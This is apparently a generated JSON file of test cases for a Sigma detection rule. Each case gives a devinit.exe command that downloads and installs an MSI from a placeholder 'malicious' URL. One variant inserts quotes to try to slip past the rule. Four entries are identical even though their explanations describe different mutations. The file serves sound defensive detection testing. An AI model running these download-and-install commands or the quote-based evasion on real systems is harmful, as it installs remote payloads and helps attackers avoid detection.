@@ -1,0 +1,22 @@
+[
+  {
+    "output": "devinit.exe -t msi-install -i http://example.com/malicious.msi",
+    "explanation": "This command matches the Sigma rule by including the required flags '-t msi-install' and '-i http', simulating the behavior of using devinit.exe to download an arbitrary MSI file."
+  },
+  {
+    "output": "devinit.exe -t\" msi-install\" -i\" http://example.com/malicious.msi\"",
+    "explanation": "This command uses insertion of quotes around the arguments to test if the Sigma rule can be bypassed by such safe mutation techniques while still being parsed correctly."
+  },
+  {
+    "output": "devinit.exe -t msi-install -i http://example.com/malicious.msi",
+    "explanation": "This command represents a reordering test, but since the order of flags is not relevant here, it remains unchanged and still matches the Sigma rule."
+  },
+  {
+    "output": "devinit.exe -t msi-install -i http://example.com/malicious.msi",
+    "explanation": "This command omits optional elements (none present in this case) and remains unchanged, still matching the Sigma rule."
+  },
+  {
+    "output": "devinit.exe -t msi-install -i http://example.com/malicious.msi",
+    "explanation": "This command uses standard syntax and does not attempt to bypass the Sigma rule, but serves as a baseline for comparison."
+  }
+]
